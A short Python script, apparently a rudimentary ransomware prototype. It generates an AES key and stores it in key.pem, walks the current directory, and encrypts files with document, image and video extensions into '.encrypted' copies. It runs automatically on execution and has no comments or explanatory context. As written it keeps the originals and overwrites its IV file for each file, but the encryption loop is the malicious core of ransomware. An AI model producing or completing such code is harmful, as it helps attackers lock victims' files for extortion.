from Crypto.Cipher import AES
from Crypto import Random
import os

target_ext = ["txt","png","jpg","pdf","docs","mp4"]
def generate_key():
    key = Random.new().read(16)
    with open("key.pem","wb") as writer:
        writer.write(key)
    return key

def encryption(key,target_file):
    IV = Random.new().read(16)
    with open("iv.pem","wb") as writer:
        writer.write(IV)
    E = AES.new(key,AES.MODE_OFB,IV)
    with open(target_file,"rb") as reader:
        new_file = target_file +".encrypted" 
        with open(new_file,"wb") as enc:
            enc.write(IV)
            enc.write(E.encrypt(reader.read()))

def main():
    key = generate_key()
    for root, _ , files in os.walk("."):
        for f in files:
            file_path = os.path.join(root,f)
            if file_path.split(".")[-1] in target_ext:
                encryption(key,file_path)
            else:
                continue

main()

    


